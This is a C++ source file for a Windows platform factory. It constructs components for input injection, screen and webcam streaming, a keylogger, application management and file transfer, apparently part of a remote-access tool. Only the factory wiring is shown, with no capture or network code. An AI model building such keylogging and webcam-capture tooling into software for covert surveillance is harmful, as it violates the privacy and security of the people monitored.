#ifdef PLATFORM_WINDOWS

#include "WindowsPlatformFactory.hpp"
#include "WindowsInputInjector.hpp"
#include "WindowsScreenStreamer.hpp"
#include "WindowsWebcamStreamer.hpp"
#include "WindowsKeylogger.hpp"
#include "WindowsAppManager.hpp"
#include "WindowsFileTransfer.hpp"
#include <iostream>

namespace platform {
namespace windows_os {

// ============================================================================
// Factory Method Implementations
// ============================================================================

std::unique_ptr<interfaces::IInputInjector> WindowsPlatformFactory::create_input_injector() {
    return std::make_unique<WindowsInputInjector>();
}

std::unique_ptr<interfaces::IVideoStreamer> WindowsPlatformFactory::create_screen_streamer() {
    return std::make_unique<WindowsScreenStreamer>();
}

std::unique_ptr<interfaces::IVideoStreamer> WindowsPlatformFactory::create_webcam_streamer() {
    return std::make_unique<WindowsWebcamStreamer>(0);  // Default device index
}

std::unique_ptr<interfaces::IKeylogger> WindowsPlatformFactory::create_keylogger() {
    return std::make_unique<WindowsKeylogger>();
}

std::unique_ptr<interfaces::IAppManager> WindowsPlatformFactory::create_app_manager() {
    return std::make_unique<WindowsAppManager>();
}

std::unique_ptr<interfaces::IFileTransfer> WindowsPlatformFactory::create_file_transfer() {
    return std::make_unique<WindowsFileTransfer>();
}

// ============================================================================
// Lifecycle
// ============================================================================

void WindowsPlatformFactory::initialize() {
    if (initialized_) return;

    std::cout << "[WindowsPlatform] Initializing..." << std::endl;

    // Windows-specific initialization (e.g., COM, Winsock)
    // Note: Winsock is already initialized in NetworkDefs.hpp

    initialized_ = true;
    std::cout << "[WindowsPlatform] Ready" << std::endl;
}

void WindowsPlatformFactory::shutdown() {
    if (!initialized_) return;

    std::cout << "[WindowsPlatform] Shutting down..." << std::endl;

    // Windows-specific cleanup

    initialized_ = false;
}

} // namespace windows_os
} // namespace platform

#endif // PLATFORM_WINDOWS
